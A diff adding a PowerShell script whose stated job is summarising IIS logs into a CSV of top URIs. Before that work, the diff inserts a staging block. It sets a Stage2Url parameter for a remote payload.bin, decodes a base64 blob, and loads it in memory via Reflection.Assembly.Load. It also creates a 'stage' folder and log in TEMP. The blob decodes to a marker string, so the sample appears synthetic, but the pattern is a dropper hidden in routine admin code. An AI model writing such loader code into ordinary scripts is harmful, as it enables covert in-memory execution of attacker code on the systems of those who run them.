@@ -1,0 +1,43 @@
+[CmdletBinding()]
+param(
+    [string]$Stage2Url = 'http://adatum.com:8080/payload.bin',
+    [int]$TimeoutSec = 149
+)
+$ErrorActionPreference = "Stop"
+
+try {
+    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo2aGhsanFkdDh1')
+    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
+    $OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
+    if ($null -ne $OperationResult) {
+        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
+    }
+}
+catch {
+    Write-Warning "Assembly load failed: $($_.Exception.Message)"
+}
+
+Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
+$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
+$LogRoot    = "D:\Logs\iis\W3SVC1"
+$Days       = 3
+$TopN       = 10
+$OutputPath = 'D:\Ops\reports\iis-top-2024-02-15.csv'
+$HtmlPath   = "D:\Ops\reports\iis-2024-02-15.html"
+
+
+$cutoff = (Get-Date).AddDays(-$Days)
+$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
+    Where-Object { $_.LastWriteTime -ge $cutoff }
+$entries = foreach ($log in $logs) {
+    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
+        $parts = $_ -split ' '
+        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
+    }
+}
+
+$entries | Group-Object Uri | Sort-Object Count -Descending |
+    Select-Object -First $TopN Name, Count |
+    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
+Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
